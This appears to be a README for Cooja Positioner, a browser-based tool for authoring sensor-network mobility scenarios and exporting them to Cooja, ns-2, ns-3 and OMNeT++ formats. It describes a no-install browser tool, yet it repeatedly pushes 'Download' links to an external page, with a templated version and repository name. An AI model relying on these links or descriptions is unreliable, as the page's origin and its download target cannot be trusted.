# Cooja Positioner v2026 - browser-based geo-scenario editor 2026

> **Cooja Positioner is a web browser tool for authoring Cooja and other simulator mobility scenarios from geographic coordinates, with client-side editing and exports for common WSN and IoT formats.**

[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathantaylor52/cooja-positioner-win-10162?style=flat-square)](https://github.com/nathantaylor52/cooja-positioner-win-10162)

---

<p align="center">
  <a href="https://nathantaylor52.github.io/cooja-positioner-win-10162/">
    <img src="https://img.shields.io/badge/Download-Cooja%20Positioner%20Latest-brightgreen?style=for-the-badge" alt="Download Cooja Positioner">
  </a>
</p>

> **[Direct Download - Cooja Positioner v2026](https://nathantaylor52.github.io/cooja-positioner-win-10162/)**

---

[Download Latest Build](https://nathantaylor52.github.io/cooja-positioner-win-10162/)

---

## About Cooja Positioner

Cooja Positioner is a browser-based editor for building geographic scenarios and turning them into simulator-ready position data. It is designed for people working with Cooja, WSN, and IoT mobility workflows who need a visual way to place nodes, define movement, and manage coordinates without relying on a local desktop app.

The tool keeps editing in the client side, so you can map out point and polygon-based scenarios, arrange static or mobile nodes, and work with waypoint timing in one place. It is also useful when you need coordinate conversion across WGS84, ECEF, and ENU, or when you want to move between Cooja position files and mobility formats used by ns-2, ns-3, and INET/OMNeT++.

---

## Features

- Client-side scenario editing in the browser
- Map-based authoring for points and polygons
- Static node placement and mobile node placement
- Waypoints with timestamp support for motion paths
- Custom WGS84 origin handling for geographic scenarios
- Coordinate conversion from WGS84 to ECEF to ENU
- Export support for Cooja `positions.dat`
- Export support for ns-2, ns-3, and INET/OMNeT++ mobility files
- Undo and redo for editing control
- Multi-selection for working with several nodes at once
- Import existing Cooja position data into the editor

---

## Installation

Cooja Positioner runs in a web browser, so there is no traditional install step required for normal use.

To work with a local copy:

1. Clone or download the repository.
2. Open the project in a browser-compatible web server or launch the built site.
3. Load the application in your browser and begin editing a scenario.

Example:

- `git clone https://github.com/nathantaylor52/cooja-positioner-win-10162.git
- open the web app from your local server or from the published build

---

## Usage

Typical workflow:

1. Open the editor in your browser.
2. Set or adjust the WGS84 origin for your scenario.
3. Add points, polygons, static nodes, or mobile nodes on the map.
4. Define waypoints and timestamps if mobility is needed.
5. Use undo, redo, and multi-selection while refining the layout.
6. Export the result as a Cooja position file or a mobility file for another simulator.

Example export targets:

- Cooja `positions.dat`
- ns-2 mobility files
- ns-3 mobility files
- INET/OMNeT++ mobility files

---

## Configuration

Most settings are managed inside the editor while you work on a scenario. The key configuration concept is the geographic origin used for coordinate conversion.

Common scenario settings include:

- WGS84 origin
- imported position data
- node placement type
- waypoint timing
- export target format

If you are preparing a reusable scenario, keep the origin and coordinate assumptions documented alongside the exported files.

---

## Requirements

- A modern web browser
- JavaScript enabled
- Access to the project files or published build
- Enough local storage or workspace space to save exported scenario data

Recommended for best results:

- A current desktop browser
- A larger screen for map-based editing
- Basic familiarity with Cooja, WSN, IoT, or mobility scenario formats

---

## FAQ

**How do I get the latest version?**  
Use the download link at the top of the page or open the published build.

**Can I edit scenarios without installing software?**  
Yes. The tool is designed to run in a web browser.

**Does it support importing existing Cooja positions?**  
Yes. Existing Cooja position data can be imported for further editing.

**Can I work with moving nodes?**  
Yes. Mobile nodes, waypoints, and timestamps are supported.

**What if my coordinates need a different origin?**  
You can define a custom WGS84 origin before exporting or converting data.

**What should I do if exports do not match my simulator setup?**  
Check the selected format, origin, and coordinate assumptions before exporting, then verify the output against your target simulator's expectations.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
